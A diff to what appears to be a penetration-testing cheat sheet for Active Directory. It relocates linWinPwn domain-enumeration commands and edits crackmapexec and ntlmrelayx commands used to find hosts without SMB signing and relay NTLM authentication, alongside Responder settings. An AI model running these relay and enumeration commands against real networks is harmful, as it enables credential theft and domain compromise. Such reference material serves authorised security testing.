@@ -58,6 +58,16 @@ sudo mncli dev show eth0
 nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
 ```
 
+## linWinPwn 
+### Unauthenticated
+```bash
+ sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
+```
+### With AD-user
+```bash
+sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
+```
+
 ## Responder
 ### Kickstart responder
 ```bash
@@ -81,11 +91,11 @@ $lnk.Save()
 ### Crackmapexec NTLM-relay
 #### Evaluate no smb-signing
 ```bash
-crackmapexec smb <IPs> --gen-relay-list <output.txt>
+crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
 ```
 #### NTLMRelayx
 ```bash
-sudo python3 ntlmrelayx.py -smb2support -tf <IPs>
+sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
 ```
 #### Disbale SMB and HTTP in Responder.conf
 ```bash
@@ -107,16 +117,6 @@ LDAP = On
 DCERPC = On
 WINRM = On
 SNMP = Off
-```
-
-## linWinPwn 
-### Unauthenticated
-```bash
- sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
-```
-### With AD-user
-```bash
-sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
 ```
 
 ```
